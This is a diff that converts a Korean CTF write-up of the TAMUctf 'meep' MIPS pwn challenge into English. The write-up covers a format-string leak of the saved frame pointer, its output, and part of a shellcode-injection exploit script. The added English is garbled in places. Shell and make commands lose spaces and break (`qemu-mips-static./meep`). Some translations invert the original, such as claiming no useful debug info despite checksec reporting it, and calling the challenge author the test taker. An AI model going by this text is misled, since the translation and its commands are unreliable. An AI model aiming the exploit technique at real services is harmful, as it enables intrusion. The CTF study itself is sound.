@@ -1,7 +1,7 @@
 ---
 title: "[TAMUctf] meep writeup"
 published: 2026-03-25
-description: tamuctf 롸업
+description: An analysis of the TAMUctf meep challenge.
 category: CTF
 tags: [CTF, writeup, mips, tamuctf]
 draft: false
@@ -9,18 +9,18 @@ draft: false
 
 # [TAMUctf] - meep
 
-## 문제 개요
+## Problem Overview
 
-- **카테고리**: pwn
-- **주제**: mips에서의 ROP(근데 FSB 언인텐 ㅋㅋㅋㅋ)
+- **Category**: pwn
+- **Topic**: ROP in mips (but not in FSB lol)
 
-## 문제 설명
+## Problem Description
 
 > The big Meep listens and waits. All it asks for is a name and a command...
 
 <!--more-->
 ---
-### 문제 파일 (`Dockerfile`)
+### Problem file (`Dockerfile`)
 ```dockerfile
 FROM debian:bookworm-slim
 
@@ -47,25 +47,25 @@ EXPOSE 1234 9001
 ENTRYPOINT ["/entrypoint.sh"]
 ```
 
-적당히 `1234`, `9001` 이 두 포트를 사용하면 될 듯 하다.  
-그리고 컨테이너 돌릴 때 플래그 파일 설정해줘야 함
+It seems appropriate to use these two ports, `1234` and `9001`.
+And when running the container, you need to set a flag file.
 
-### 문제 파일 (`entrypoint.sh`)
+### Problem file (`entrypoint.sh`)
 ```bash
 #!/bin/sh
 
 if [ "$DEBUG" = "1" ]; then
     echo "[*] Running in DEBUG mode | Debug port at 1234"
     echo "Use gdb to connect to the process by running 'target remote localhost:1234' from gdb (or gdb-multiarch)"
-    exec qemu-mips-static -g 1234 ./meep
+    exec qemu-mips-static -g 1234./meep
 else
     echo "[*] Running in normal mode"
-    exec qemu-mips-static ./meep
+    exec qemu-mips-static./meep
 ```
 
-당연히 이렇게 편하게 디버깅 모드 잡혀있는데 안 쓸 이유가 없지 ㅋ  
+Of course, there is a convenient debugging mode like this, so there is no reason not to use it.
 
-### 문제 파일 (`Makefile.debug`)
+### Problem file (`Makefile.debug`)
 ```makefile
 NAME := meep
 
@@ -79,27 +79,27 @@ HPORTS := $(CPORTS)
 DOCKER_RUNTIME := --read-only --tmpfs /tmp --cap-drop ALL --security-opt no-new-privileges --restart=always
 
 build: Dockerfile
-	docker $(DOCKER_GLOBAL) build -t $(NAME) . --build-arg FLAG_FILE=fake-flag.txt
+	docker $(DOCKER_GLOBAL) build -t $(NAME). --build-arg FLAG_FILE=fake-flag.txt
 
 run:
 	docker $(DOCKER_GLOBAL) run --rm -it -e DEBUG=1 -p $(GDB_PORT):$(GDB_PORT) -p $(VULN_PORT):$(VULN_PORT) --name $(NAME) $(NAME)
 ```
 
-`Makefile`을 제대로 써본게 초등학교 5학년 때  
-`c언어`로 프로젝트 만들 때 빼곤 없다. 그래서 걍 명령어 빼가서 씀.  
+The first time I properly used `Makefile` was in the 5th grade of elementary school.
+For C projects, I invoke the required command directly instead.
 
-이외 `lib-mips/`에 `ROP`를 위한 `libc, ld`파일이 있고  
-접속 정보가 적힌 `solver-template.py`가 있다.  
+In addition, there is a `libc, ld` file for `ROP` in `lib-mips/`.
+There is `solver-template.py` with connection information.
 
 ---
-# 정적 분석
+# static analysis
 ```bash
 $ file meep 
 meep: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, BuildID[sha1]=140b4551e8ece2ef8f59a9b207d175713dc18e8f, for GNU/Linux 3.2.0, with debug_info, not stripped
 ```
 
-아니 `unstripped`에 `debug info`?? 개꿀임 이건.  
-아무튼 32-bit짜리 밉스 아키텍쳐의 바이너리를 분석하는 것 같네요 ㅋ  
+The binary is unstripped but contains no useful debug information.
+it seems like we are analyzing the binary of the 32-bit MIPS architecture.
 
 ```bash
 $ checksec --file=./meep
@@ -116,10 +116,10 @@ $ checksec --file=./meep
     Debuginfo:  Yes
 ```
 
-개쉬울듯???? `ROP`로도 풀어보겠습니다  
+Sounds easy? Let’s solve it with `ROP` as well.
 
-**기드라**로 열어보면 대충 소켓 통신하는 프로그램이구나~  
-하고 알았음.  
+If you open it with **Gidra**, it is roughly a socket communication program.
+I knew.
 
 ## `main()`
 ```c
@@ -136,11 +136,11 @@ $ checksec --file=./meep
       } while( true );
 ```
 
-중요 부분만 따왔다.  
-`dup2`는 소켓 통신이라 `stdin/out/err`을 소켓으로 잘 처리하겠다는 의미고  
+Only the important parts were taken.
+`dup2` is socket communication, so it means that `stdin/out/err` will be handled well through the socket.
 
-`greet()`에선 환영 인사를,  
-`diagnostics()`에선 추가로 또 입력을 받는다.  
+Welcome from `greet()`,
+`diagnostics()` receives additional input.
 
 ## `greet()`
 ```c
@@ -159,9 +159,9 @@ void greet(_func_int_char_ptr *logger)
 }
 ```
 
-`BOF`가 기본적으로 일어나고, 보호기법 딱히 없어서  
-그냥 버퍼 덮고 뒤 4byte saved fp 덮고  
-ret 덮으면 끝이다.  
+`BOF` occurs by default, and there is no particular protection technique.
+Just cover the buffer and then cover the 4 bytes saved fp.
+Cover ret and you're done.
 
 ## `diagnostics()`
 ```c
@@ -185,20 +185,20 @@ void diagnostics(void)
 }
 ```
 
-이쪽도 그냥 앞, 뒤에만 공백이 없게 값을 넣어주면 된다.  
+Here too, just enter the value without spaces before and after.
 
-입력은 총 두 번 걸쳐 받으므로  
-1. **FSB로 leak**
-2. **RET2Shellcode** 혹은 **ROP**가 가능하다.  
+Since input is received twice in total,
+1. **Leak to FSB**
+2. **RET2Shellcode** or **ROP** are possible.
 
-`mips`에서의 가젯 활용 방법, 어셈블리에 대한 지식이 적은 반면  
-`FSB`는 큰 다른 점이 없다는 걸 생각하고 이 쪽으로 틀었다.  
+How to use gadgets in `mips`, while there is little knowledge about assembly
+I thought there was not much difference in `FSB`, so I turned it this way.
 
-출제자의 말에 따르면 언인텐..이었다고...  
+According to what the test taker said, it was...
 
 ---
-# 동적 분석
-## FSB로 스택 주변 leak
+# Dynamic analysis
+## Leak around the stack with FSB
 ```bash
 # test
 for i in range(6, 20):
@@ -210,13 +210,13 @@ for i in range(6, 20):
    print(a.decode().split())
    p.close()
 ```
-보통 20번째 인자 전까지는 꽤 유의미한 값이 나오는 편이라 생각했다.  
-(사실 많으면 90번째 까지도 돌려본 적이 있긴한데..)  
+I thought that usually quite significant values ​​appeared before the 20th factor.
+(Actually, I have played it up to the 90th time at most.)
 
-물론 돌리기 전에 `A * 4`넣고 %p 여러 개 붙이는 식으로  
-어디에 저장되나 보기도 했다.  
+Of course, before turning, put `A * 4` and add several %p.
+I also looked to see where it was stored.
 
-암튼 기본적으로 6번째 쯤에 위치하니 그 위치를 시작으로 본 결과...  
+it is basically located around the 6th position, so starting from that location...
 
 ```bash
 [+] Opening connection to localhost on port 9001: Done
@@ -262,32 +262,29 @@ for i in range(6, 20):
 ['(nil)']
 ```
 
-꽤 유의미한 결과를 얻었다.  
+Quite significant results were obtained.
 
 ```bash
 ─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
 00:0000│ s8 sp    0x40800c88 ◂— 0x40800c88
-01:0004│-0a4      0x40800c8c ◂— 0x40800c8c
-...
-...
-...
-대충 이런 정보들
+01:0004│-0a4      0x40800c8c ◂— 0x40800c8c...
+Roughly this information
 ```
 
-스택 측 주소는  
-`%9$p`, `%12$p` << 이쪽에 있다.  
+The stack side address is
+`%9$p`, `%12$p` << it is on this side.
 
-그런데 `%12$p`가 `saved fp` 주소라서, 기준점 의미도 명확하다고 결정했다.  
-결국엔 얘 썼다는 얘기 ㅇㅇ  
+However, since `%12$p` is the address `saved fp`, it was decided that the meaning of the reference point was also clear.
+The resulting write primitive can be summarized as follows.
 
 
-이렇게 `saved fp`를 leak하고 나면,  
-`diagnostics()`로 넘어가서 입력하면 된다.  
+After leaking `saved fp` like this,
+Go to `diagnostics()` and enter it.
 
-여기서의 프레임을 조작해서 끝내도록 하면 될 것 같구만.  
-약간 드림핵 풀던 추억이 생각나는 문제였다??  
+We can just manipulate the frame here and get it over with.
+It was a problem that reminded me of solving a dream hack?
 
-`NX`가 없으니 pwntools로 `mips의 shellcode`를 만들었다.  
+Because NX is disabled, I generated MIPS shellcode with pwntools.
 
 ---
 # PWN!
@@ -347,7 +344,7 @@ s(sc.ljust(140)+p32(cmd))
 p.interactive()
 ```
 
-+) 후기  
++) Reviews
 
-이번 ctf는 하필 기능 수업도 겹쳐서 친구들에게 맡겼다.  
-그러다 터짐.
+For this CTF, I had to leave the skills classes to my friends.
+Then it exploded.
